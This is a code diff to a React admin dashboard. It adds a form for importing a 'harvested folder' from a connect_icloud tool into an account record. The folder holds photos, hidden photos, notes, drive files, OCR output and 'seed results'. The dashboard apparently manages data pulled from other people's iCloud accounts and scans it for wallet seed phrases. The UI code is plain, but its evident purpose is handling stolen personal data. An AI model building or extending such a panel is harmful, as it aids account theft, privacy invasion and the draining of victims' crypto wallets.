@@ -198,6 +198,7 @@ function Panel({ admin, onLogout }) {
     state,
     loadAccounts,
     refreshAll,
+    importAccount,
     openAccount,
     clearAccount,
     pingAccount,
@@ -210,6 +211,11 @@ function Panel({ admin, onLogout }) {
   const [filter, setFilter] = useState("all");
   const [view, setView] = useState("accounts");
   const [showList, setShowList] = useState(true);
+  const [importOpen, setImportOpen] = useState(false);
+  const [importPath, setImportPath] = useState("");
+  const [importEmail, setImportEmail] = useState("");
+  const [importBusy, setImportBusy] = useState(false);
+  const [importError, setImportError] = useState("");
 
   useEffect(() => {
     if (state.status !== "online") return undefined;
@@ -319,8 +325,18 @@ function Panel({ admin, onLogout }) {
                 ))}
                 <button
                   type="button"
+                  onClick={() => {
+                    setImportError("");
+                    setImportOpen(true);
+                  }}
+                  className="ml-auto h-6 rounded-full px-2 text-[10px] font-medium text-[#0066cc] hover:underline"
+                >
+                  ＋ Import
+                </button>
+                <button
+                  type="button"
                   onClick={refreshAll}
-                  className="ml-auto h-6 rounded-full px-2 text-[10px] text-[#0066cc] hover:underline"
+                  className="h-6 rounded-full px-2 text-[10px] text-[#0066cc] hover:underline"
                 >
                   Refresh
                 </button>
@@ -394,6 +410,78 @@ function Panel({ admin, onLogout }) {
           </div>
         )}
       </aside>
+
+      {importOpen ? (
+        <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/30 px-4">
+          <form
+            onSubmit={async (event) => {
+              event.preventDefault();
+              if (importBusy) return;
+              setImportBusy(true);
+              setImportError("");
+              try {
+                const result = await importAccount(importPath.trim(), importEmail.trim());
+                setImportOpen(false);
+                setImportPath("");
+                setImportEmail("");
+                if (result?.accountId) {
+                  setShowList(false);
+                  openAccount(result.accountId);
+                }
+              } catch (failure) {
+                setImportError(failure.message);
+              } finally {
+                setImportBusy(false);
+              }
+            }}
+            className="w-full max-w-[480px] rounded-[14px] border border-[#e5e5ea] bg-white p-5 shadow-2xl"
+          >
+            <h2 className="text-[16px] font-semibold">Import a harvested folder</h2>
+            <p className="mt-1 text-[12px] leading-5 text-[#6e6e73]">
+              Maps an <code>out/</code> tree (photos, hidden, notes, drive, ocr) into this
+              account's export, reusing the existing OCR and seed results. The folder must be on
+              the server.
+            </p>
+            <label className="mt-4 block text-[11px] font-medium uppercase tracking-[0.05em] text-[#6e6e73]">
+              Folder path
+              <input
+                value={importPath}
+                onChange={(event) => setImportPath(event.target.value)}
+                placeholder="/home/…/connect_icloud/out"
+                className="mt-1 block h-9 w-full rounded-[8px] border border-[#d2d2d7] px-3 text-[12px] font-normal tracking-normal outline-none focus:border-[#0071e3]"
+              />
+            </label>
+            <label className="mt-3 block text-[11px] font-medium uppercase tracking-[0.05em] text-[#6e6e73]">
+              Account email
+              <input
+                value={importEmail}
+                onChange={(event) => setImportEmail(event.target.value)}
+                placeholder="example@icloud.com"
+                className="mt-1 block h-9 w-full rounded-[8px] border border-[#d2d2d7] px-3 text-[12px] font-normal tracking-normal outline-none focus:border-[#0071e3]"
+              />
+            </label>
+            {importError ? (
+              <p className="mt-3 rounded-[8px] bg-[#fff2f2] px-3 py-2 text-[11px] text-[#c4000a]">{importError}</p>
+            ) : null}
+            <div className="mt-4 flex justify-end gap-2">
+              <button
+                type="button"
+                onClick={() => setImportOpen(false)}
+                className="h-8 rounded-[8px] border border-[#d2d2d7] px-3 text-[12px]"
+              >
+                Cancel
+              </button>
+              <button
+                type="submit"
+                disabled={importBusy || !importPath.trim() || !importEmail.trim()}
+                className="h-8 rounded-[8px] bg-[#0071e3] px-3 text-[12px] font-medium text-white disabled:opacity-50"
+              >
+                {importBusy ? "Importing…" : "Import"}
+              </button>
+            </div>
+          </form>
+        </div>
+      ) : null}
 
       <main className={`${showList ? "hidden" : "flex"} min-w-0 flex-1 flex-col lg:flex`}>
         {view === "submissions" ? (
